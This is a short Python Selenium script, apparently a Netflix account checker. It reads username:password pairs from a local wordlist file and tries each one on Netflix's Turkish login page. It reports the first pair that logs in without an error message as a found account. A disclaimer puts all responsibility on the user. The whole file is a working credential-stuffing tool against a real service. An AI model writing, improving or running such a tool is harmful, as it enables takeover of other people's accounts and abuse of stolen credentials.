#Selenium
from selenium import webdriver
import time
import os
print("""
	this program created by $bash
	""")
time.sleep(4)
os.system("cls")
print("""
	The user is solely responsible for what they will do from the moment they open the program.
""")
time.sleep(5)
os.system("cls")
browser = webdriver.Firefox()
w = open("pass.txt","r")
for wordlist in w:
	time.sleep(2)
	whitelist = wordlist.split(":")
	id_username = whitelist[0]
	id_passaword = whitelist[1]
	time.sleep(2)
	browser.get("https://www.netflix.com/tr/login")
	time.sleep(1)
	## USERNAME ELEMENT FIND ##
	username = browser.find_element_by_name("userLoginId")	
	###########################
	##   PASSAWORD ELEMENT FIND ##
	passaword = browser.find_element_by_name("password")
	##############################
	## LOGIN BUTTON ELEMENT FIND ##
	button = browser.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div[1]/form/button")
	##############################
	##  ACCOUNT ID AND PASS ##
	login_username = id_username
	login_password = id_passaword
	username.send_keys(login_username)
	passaword.send_keys(login_password)
	##########################
	## BUTTON CLICK ##
	button.click()
	time.sleep(4)
	try:
		error = browser.find_element_by_class_name("ui-message-contents")
		pass
	except:
		break
print("""
[*] account founded 
[*] id : %s
[*] pas: %s
 [[-~]] program created by $bash [[~-]]
	"""%(login_username,login_password))
time.sleep(2)
browser.close()
##################
	